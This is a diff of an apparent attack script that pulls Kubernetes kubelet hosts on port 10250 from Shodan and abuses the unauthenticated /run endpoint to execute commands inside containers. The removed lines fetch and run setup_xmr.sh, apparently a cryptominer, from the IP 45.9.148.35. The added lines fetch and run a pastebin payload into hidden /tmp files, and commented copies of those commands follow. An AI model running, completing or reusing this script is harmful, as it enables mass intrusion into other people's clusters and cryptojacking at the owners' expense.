@@ -6,7 +6,7 @@ echo ''
 
 function get_from_shodan(){
 if [ -f "./kubernetes.json.gz" ]; then rm -f ./kubernetes.json.gz 2>/dev/null; fi
-shodan download --limit -1 ./kubernetes 'port:10250 after:20-02-2021 ssl:true 404'  # maybee other is better working ;) :P
+shodan download --limit 100 ./kubernetes 'port:10250 after:20-02-2021 ssl:true 404'  # maybee other is better working ;) :P
 if [ -f "./ips.txt" ]; then rm -f ./ips.txt 2>/dev/null; fi
 shodan parse --fields ip_str ./kubernetes.json.gz >> ./ips.txt
 if [ -f "./kubernetes.json.gz" ]; then rm -f ./kubernetes.json.gz 2>/dev/null; fi
@@ -41,11 +41,13 @@ timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$po
 timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
 timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
 
-timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.x1mr"
-timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl http://45.9.148.35/chimaera/sh/setup_xmr.sh -o /tmp/.x2mr"
-timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
-timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget https://pastebin.com/raw/dNm3FiAc -O /tmp/.x1mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl https://pastebin.com/raw/dNm3FiAc -o /tmp/.x2mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sed -i 's/\r$//' /tmp/.x1mr && bash /tmp/.x1mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sed -i 's/\r$//' /tmp/.x1mr && sh /tmp/.x2mr"
 done < $TEMPFILE
+# wget https://pastebin.com/raw/dNm3FiAc -O /tmp/.x1mr
+# sed -i 's/\r$//' /tmp/.x1mr && sh /tmp/.x1mr
 rm -f $TEMPFILE
 }
 
